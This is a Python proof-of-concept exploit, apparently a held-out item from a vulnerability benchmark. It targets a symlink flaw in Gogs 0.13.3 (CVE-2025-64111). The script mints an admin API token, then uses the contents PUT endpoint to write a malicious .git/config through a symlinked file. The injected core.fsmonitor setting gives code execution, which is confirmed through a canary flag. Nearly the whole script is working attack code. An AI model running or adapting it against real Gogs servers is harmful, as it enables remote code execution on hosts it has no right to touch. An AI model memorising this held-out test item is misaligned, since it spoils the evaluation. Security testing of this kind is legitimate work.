#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-64111 residual exploit: write to .git/config through
file symlink via the API PUT contents endpoint.

The API handler (PUT /api/v1/repos/{owner}/{repo}/contents/{path}) calls
UpdateRepoFile with IsNewFile=false and OldTreeName==NewTreeName (pure update).
On V1 (0.13.3), the db-level IsSymlink check only guards IsNewFile and move
paths, so the update path has NO symlink check. The route-level API handler
also has NO symlink check (unlike the web editor). Result: the symlink is
followed, and os.WriteFile writes directly to .git/config.

On V2 (0.13.4), additional symlink checks close this gap.

Same canary mechanism as original_poc.py: injected core.fsmonitor reads the
planted PCB_FLAG.

Mechanism: file-write through file symlink (link -> .git/config) via API PUT.
Canary: rce-oob (core.fsmonitor reads planted flag file).
"""

import base64
import time

import requests

from gogs_util import (
    ADMIN_USER,
    ADMIN_PASS,
    REPO_NAME,
    PORTS,
    base_url,
    clear_flag_result,
    malicious_config,
    read_flag_result,
)


def run(*, version: str = "v1", token: str = "") -> str:
    """Run the CVE-2025-64111 bypass via the API PUT endpoint. Returns observable result."""
    url = base_url(version)
    clear_flag_result(version)

    # If no token provided, create one
    if not token:
        r = requests.post(
            f"{url}/api/v1/users/{ADMIN_USER}/tokens",
            auth=(ADMIN_USER, ADMIN_PASS),
            json={"name": f"bypass_{int(time.time())}"},
            timeout=10,
        )
        if r.status_code == 201:
            token = r.json()["sha1"]
        else:
            return f"token_creation_failed:{r.status_code}"

    headers = {"Authorization": f"token {token}"}

    # 1. Read the current file to get its SHA (needed for the PUT API)
    r = requests.get(
        f"{url}/api/v1/repos/{ADMIN_USER}/{REPO_NAME}/contents/link",
        headers=headers,
        timeout=10,
    )
    if r.status_code != 200:
        return f"get_contents_failed:{r.status_code}"

    file_sha = r.json().get("sha", "")

    # 2. PUT the malicious config content through the symlink
    config_content = malicious_config()
    payload = {
        "content": base64.b64encode(config_content.encode()).decode(),
        "message": "update link",
        "sha": file_sha,
    }
    r = requests.put(
        f"{url}/api/v1/repos/{ADMIN_USER}/{REPO_NAME}/contents/link",
        headers=headers,
        json=payload,
        timeout=30,
    )

    # The API may return 500 even on success: the symlink write to .git/config
    # succeeds and triggers fsmonitor during git add, but the subsequent
    # git commit fails due to fsmonitor warnings. The flag is still written.
    api_status = r.status_code

    # 3. Wait for fsmonitor to trigger during git add/commit
    time.sleep(3)

    # 4. Read the flag result (check regardless of HTTP status)
    result = read_flag_result(version)
    if result:
        return result

    # On V2 (0.13.4), the API rejects symlink updates before any write happens.
    if api_status >= 400:
        return f"blocked:{api_status}"
    return f"no_flag_detected:http_{api_status}"


if __name__ == "__main__":
    import sys
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(f"Running bypass PoC on {v}...")
    print(f"Result: {run(version=v)}")
